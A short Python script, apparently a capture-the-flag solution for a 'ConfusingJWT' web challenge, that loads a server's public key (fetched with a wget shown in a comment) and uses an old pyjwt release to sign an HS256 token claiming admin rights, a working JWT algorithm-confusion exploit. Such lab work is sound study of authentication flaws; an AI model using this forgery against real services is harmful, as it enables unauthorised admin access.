@@ -1,0 +1,17 @@
+from jwt import encode
+import os
+
+# First downloaded the file with:
+# wget -O key.pem http://100.84.44.31:9029/show_key
+
+# Necessary to have  pyjwt==0.4.3 which is an older version
+
+root = os.path.dirname("__file__") 
+
+with open(os.path.join(root, '/Users/anauroranon/Documents/GitHub/CyberChallenge2023/Web/ConfusingJWT/key.pem'), 'rb') as key_file:
+    pub_key = key_file.read() 
+    
+payload = {"user_type": "admin"} 
+
+token = encode(payload, key=pub_key, algorithm='HS256') 
+print(token)
